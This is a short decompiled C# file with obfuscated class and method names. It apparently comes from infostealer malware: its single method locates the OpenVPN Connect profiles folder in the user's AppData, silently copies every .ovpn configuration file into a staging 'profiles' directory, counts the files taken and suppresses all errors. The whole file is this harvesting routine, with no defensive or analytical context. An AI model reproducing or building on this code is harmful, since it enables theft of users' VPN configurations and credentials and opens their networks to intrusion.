using System;
using System.IO;
using ns13;

namespace ns4;

internal sealed class Class15
{
	public static void smethod_0(string string_0)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(string_0 + "\\profiles");
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (Path.GetExtension(text)!.Contains("ovpn"))
				{
					Class55.int_7++;
					File.Copy(text, Path.Combine(string_0, "profiles\\" + Path.GetFileName(text)));
				}
			}
		}
		catch
		{
		}
	}
}
